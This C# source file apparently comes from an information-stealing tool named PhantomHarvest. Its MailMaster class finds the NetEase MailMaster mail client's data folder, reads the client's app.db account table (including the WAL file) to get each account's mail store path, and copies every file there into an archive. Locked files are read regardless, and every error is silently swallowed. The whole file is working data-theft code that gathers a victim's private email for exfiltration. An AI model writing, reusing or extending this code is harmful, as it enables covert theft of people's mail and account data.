using System;
using System.Collections.Generic;
using System.IO;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Mails
{
	internal class MailMaster
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data")))
				{
					List<string> dataPath = MailMaster.GetDataPath();
					foreach (string text2 in dataPath)
					{
						if (Directory.Exists(text2))
						{
							string dirName = Path.GetFileName(text2);
							string[] files = Directory.GetFiles(text2, "*", SearchOption.AllDirectories);
							foreach (string file in files)
							{
								try
								{
									byte[] fileBytes = LockedFile.ReadLockedFile(file);
									if (fileBytes != null)
									{
										string relativePath = file.Substring(text2.Length);
										if (relativePath.StartsWith("\\") || relativePath.StartsWith("/"))
										{
											relativePath = relativePath.Substring(1);
										}
										string entryName = MailMaster.MailName + "/" + dirName + "/" + relativePath.Replace("\\", "/");
										
										using (MemoryStream ms = new MemoryStream(fileBytes))
										{
											zip.AddStream(ArchiveManager.Compression.Deflate, entryName, ms, DateTime.Now, "");
										}
									}
								}
								catch {}
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		private static List<string> GetDataPath()
		{
			List<string> list = new List<string>();
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data\\app.db");
			if (!File.Exists(text))
			{
				return list;
			}
			try
			{
				byte[] fileBytes = LockedFile.ReadLockedFile(text);
				DataParser sqliteHandler = new DataParser(fileBytes);
				
				// 检查 WAL 文件
				string walPath = text + "-wal";
				if (File.Exists(walPath))
				{
					try 
					{
						byte[] walBytes = LockedFile.ReadLockedFile(walPath);
						if (walBytes != null)
						{
							sqliteHandler.ApplyWal(walBytes);
						}
					}
					catch {}
				}

				if (!sqliteHandler.ReadTable("Account"))
				{
					return list;
				}
				for (int i = 0; i < sqliteHandler.GetRowCount(); i++)
				{
					string value = sqliteHandler.GetValue(i, "DataPath");
					list.Add(value);
				}
			}
			catch
			{
			}
			return list;
		}

		public static List<int> FindBytes(byte[] src, byte[] find)
		{
			List<int> list = new List<int>();
			if (src == null || find == null || src.Length == 0 || find.Length == 0 || find.Length > src.Length)
			{
				return list;
			}
			for (int i = 0; i < src.Length - find.Length + 1; i++)
			{
				if (src[i] == find[0])
				{
					int num = 1;
					while (num < find.Length && src[i + num] == find[num])
					{
						if (num == find.Length - 1)
						{
							list.Add(i);
						}
						num++;
					}
				}
			}
			return list;
		}

		public static string MailName = "MailMaster";
	}
}
